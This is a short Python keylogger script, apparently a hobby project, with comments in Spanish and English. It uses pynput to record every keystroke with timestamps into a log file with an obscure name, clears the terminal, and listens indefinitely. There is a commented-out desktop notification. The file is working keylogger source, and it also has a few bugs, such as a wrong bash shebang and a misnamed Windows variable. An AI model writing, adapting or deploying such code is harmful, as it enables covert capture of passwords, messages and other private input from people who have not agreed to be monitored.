#/bin/bash
#utf-8

from pynput.keyboard import Key, Listener
import platform
import logging
import os

sistema_operativo = platform.system()

def runBash(orderLin, orderWin="echo 'Se ejecutó una orden pero no para Winx64_86x'"):
    if sistema_operativo == 'Windows':
       os.system(orderwin)
    elif sistema_operativo == 'Linux':
       os.system(orderLin)
    else:
        print("[X] Not SO Detected")
 
logging.basicConfig(filename=("a4s9k3v7.klg"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
print("Sucefully created keyLoggerFile...")

runBash("clear", "cls")
print("Sucefully cleared")
 
def on_press(key):
    logging.info(str(key))

print("Listening to orders...")

# (WHILE TRUE)
with Listener(on_press=on_press) as listener :
    listener.join()
    
#runBash("notify-send -u critical -t 5000 'KeyLOGGER dice:' 'Corriendo KeyLogger...'")
